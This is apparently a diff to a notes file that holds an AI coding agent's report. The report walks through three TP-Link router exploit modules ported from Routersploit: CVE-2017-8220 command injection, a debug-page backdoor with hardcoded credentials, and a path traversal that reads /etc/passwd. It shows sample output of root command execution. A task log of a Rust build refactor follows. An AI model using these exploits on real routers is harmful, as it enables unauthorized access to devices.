@@ -1087,3 +1087,110 @@ root:x:0:0:root:/root:/bin/sh
 Verification
 Modules compiled successfully. Logic follows Routersploit implementations 1:1, including headers, payloads, and specific credential usage.
 
+
+
+
+
+
+I have implemented the 3 requested TP-Link modules ported from Routersploit:
+
+Archer C2/C20i RCE (CVE-2017-8220): 1:1 port using the [IPPING_DIAG...] payload.
+WDR740N Backdoor: Uses the DebugResultRpm method found in the python module source.
+WDR740N Path Traversal: 1:1 port allowing arbitrary file read.
+
+TP-Link Routersploit Modules Walkthrough
+This update adds 3 modules ported from the Routersploit framework, targeting common TP-Link vulnerabilities.
+
+1. Archer C2/C20i Remote Code Execution (CVE-2017-8220)
+Authenticated RCE using command injection in the 
+host
+ parameter.
+
+Original Module: archer_c2_c20i_rce.py
+Target: /cgi?2
+Usage
+Select Module: exploits/tplink/tplink_archer_c2_c20i_rce
+target: <target_ip>
+Command to execute [uname -a]: uname -a
+[*] Sending injection payload...
+[*] Triggering execution...
+[+] Exploit triggered successfully (Blind RCE).
+[*] If the command was interactive (like execution), you won't see output here.
+
+2. WDR740N Debug Backdoor
+Exploits a debug page (DebugResultRpm.htm) that allows command execution with hardcoded credentials (osteam / 5up).
+
+Original Module: wdr740nd_wdr740n_backdoor.py
+Target: /userRpm/DebugResultRpm.htm
+Usage
+Select Module: exploits/tplink/tplink_wdr740n_backdoor
+target: <target_ip>
+Command to execute [uname -a]: id
+[*] Sending exploit request...
+[+] Request successful!
+[+] Command Output:
+uid=0(root) gid=0(root)
+
+3. WDR740N Path Traversal
+Unauthenticated arbitrary file read using path traversal (../).
+
+Original Module: wdr740nd_wdr740n_path_traversal.py
+Target: /help/
+Usage
+Select Module: exploits/tplink/tplink_wdr740n_path_traversal
+target: <target_ip>
+File to read [/etc/shadow]: /etc/passwd
+[*] Target: http://192.168.1.1
+[*] Using URL-encoded dots to bypass local normalization...
+[*] URL: http://192.168.1.1/help/%2e%2e/%2e%2e/.../etc/passwd
+[+] Request successful!
+[+] File Content (/etc/passwd):
+root:x:0:0:root:/root:/bin/sh
+...
+Verification
+Modules compiled successfully. Logic follows Routersploit implementations 1:1, including headers, payloads, and specific credential usage.
+
+
+
+
+1
+Adding walkdir to [build-dependencies] in Cargo.toml.
+
+2
+Refactoring build.rs to use walkdir and generate AVAILABLE_MODULES.
+
+3
+Updating src/commands modules to use standard dispatch mechanism and removing legacy boilerplate.
+
+4
+Updating src/commands for scanner and creds manually due to multi-file edit failure, and refactoring mod.rs.
+
+5
+Updating task.md and verifying compilation.
+
+6
+Fixing compilation errors in src/commands modules.
+
+7
+Re-running functionality check.
+
+8
+Waiting for compilation to finish and then verifying module listing.
+
+9
+Fixing build.rs warnings and verifying runtime behavior.
+
+10
+Finalizing verification and updating task list.
+
+I have successfully refactored build.rs and src/commands to move module discovery to compile-time.
+
+build.rs now uses walkdir for robust scanning and generates AVAILABLE_MODULES constants.
+module discovery is now instant (compile-time constant) rather than runtime directory scanning.
+verified that the project compiles cleanly (fixed unused imports and definition errors).
+The system is now more reliable and stable as requested.
+
+
+
+
+
